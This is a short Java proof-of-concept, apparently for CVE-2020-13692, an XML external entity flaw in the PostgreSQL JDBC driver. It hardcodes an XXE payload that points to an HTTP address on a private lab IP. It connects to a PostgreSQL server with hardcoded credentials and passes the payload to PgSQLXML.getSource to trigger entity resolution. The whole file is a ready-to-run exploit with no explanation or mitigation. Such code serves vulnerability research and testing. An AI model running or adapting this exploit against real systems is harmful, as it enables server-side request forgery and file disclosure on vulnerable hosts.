package postgresql;

import org.postgresql.core.BaseConnection;
import org.postgresql.jdbc.PgSQLXML;

import java.sql.*;

/**
 * reference:
 */
public class CVE_2020_13692 {

    public static void main(String[] args) throws SQLException {
        String Target_URL = "http://192.168.26.130:8080";
        String XXE_EXAMPLE =
                "<!DOCTYPE foo [<!ELEMENT foo ANY >\n"
                        + "<!ENTITY xxe SYSTEM \"" + Target_URL + "\">]>"
                        + "<foo>&xxe;</foo>";
        String url = "jdbc:postgresql://192.168.26.130:5432/test";
        String username = "postgres";
        String password = "123.com";
        System.out.println(XXE_EXAMPLE);
        Connection connection = DriverManager.getConnection(url, username, password);

        BaseConnection baseConn = connection.unwrap(BaseConnection.class);
        PgSQLXML xml = new PgSQLXML(baseConn, XXE_EXAMPLE);
        xml.getSource(null);

    }

}
